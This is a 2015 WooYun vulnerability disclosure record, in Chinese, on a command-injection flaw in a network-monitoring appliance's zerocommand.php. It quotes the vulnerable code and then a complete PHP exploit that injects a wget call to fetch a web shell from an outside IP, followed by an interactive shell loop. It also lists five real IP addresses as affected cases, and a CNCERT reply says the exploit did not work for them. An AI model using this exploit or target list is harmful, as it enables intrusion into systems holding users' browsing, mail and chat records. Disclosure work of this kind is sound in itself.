{"id": 33499, "wybug_id": "wooyun-2015-0108651", "wybug_title": "中科新业网络哨兵任意命令执行getshell", "wybug_corp": "中科新业", "wybug_author": "路人甲", "wybug_date": "2015-04-20 14:14", "wybug_open_date": "2015-07-23 09:54", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "任意文件写入利用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-27：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-06-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-23：\t细节向公众公开  简要描述： 中科新业网络哨兵任意命令执行getshell，导致其所监控的网络内网络用户隐私泄露，包括上网记录，邮件，聊天记录等  详细说明：  \n/manage/admin/zerocommand.php\n造成漏洞的部分代码为：\nif ( $_POST['submit'] != \"\" ){\t//...\tdefault :\t\t$sel1 = \" selected\";\t\t$cmd = $gCommand.$lines;}$tmp = array( );$base_dir = $gFileTransferSavePath.\"tools\";$cmd .= \"  -z4 \";exec( \"./syscommand \\\"\".$base_dir.$cmd.\"\\\"\", $tmp );$fileContent = join( \"\\n\", $tmp );\n很明显的命令执行漏洞，写好exp直接运行即可：\n<?php$host = @$argv['1'];$port = @$argv['2'];if(count($argv)<3) die(\"\\n Usage : exp.php 127.0.0.1 80\\n\");$code = \"wget%20http://61.139.133.70/images/menu1.gif%20-O%20bash.php\";$path = \"/manage/admin/zerocommand.php?lines=woo||\".$code.\"||yun\";$post = \"submit=qqqq\";$url = ($port == '443') ? \"https://\".$host : $url = \"http://\".$host;$resp = request($url.$path,'',$post);$sh = \"/manage/admin/bash.php\";while(true){\tprint \"\\nroot@bash# \";\tif (($cmd = trim(fgets(STDIN))) == \"exit\") break;\t$header = array(\"Cmd\"=>base64_encode($cmd));\t$resps  = request($url.$sh,$header);\tpreg_match('/___(.*)/is', $resps, $m) ? print $m[1] : die(\"\\n[-] Exploit failed!\\n\");}function request($url, $headers = array(), $post='',$timeout=30){\t$curl = curl_init();    curl_setopt($curl, CURLOPT_URL, $url);    if(is_array($headers) && !empty($headers)){\t\t$header = array();\t\tforeach ($headers as $key=>$val){\t\t\t$header[] = \"$key: $val\";\t\t}\t\tcurl_setopt($curl, CURLOPT_HTTPHEADER, $header);\t}    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);\tcurl_setopt($curl, CURLOPT_POST, 1);    curl_setopt($curl, CURLOPT_POSTFIELDS, $post);    curl_setopt($curl, CURLOPT_TIMEOUT, $timeout);    curl_setopt($curl, CURLOPT_HEADER, 0);    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);    $resp = curl_exec($curl);\tif(curl_errno($curl)){\t\treturn curl_error($curl);\t}    curl_close($curl);    return $resp;}?>\n   漏洞证明：  \nhttps://219.134.131.240/manage/admin/bash.php?x=phpinfo();\n\nphp zerocommand_exp.php 219.134.131.240 443\n\n\n5个案例：https://219.134.131.240https://218.246.71.229https://218.26.227.5https://222.22.224.3https://124.164.234.204   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-04-24 09:52 厂商回复： CNVD未直接复现所述情况，已经由CNVD通过网站公开联系方式向软件生产厂商通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-04-21 11:15 |    \t\tcncert国家互联网应急中心(乌云厂商)\t\t \n  您好！    感谢您对CNVD的支持，您在此提供的exp无法使用，请您重新提供下exp，并邮件vreport@cert.org.cn，以便CNVD及时验证、处置。    祝好！    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}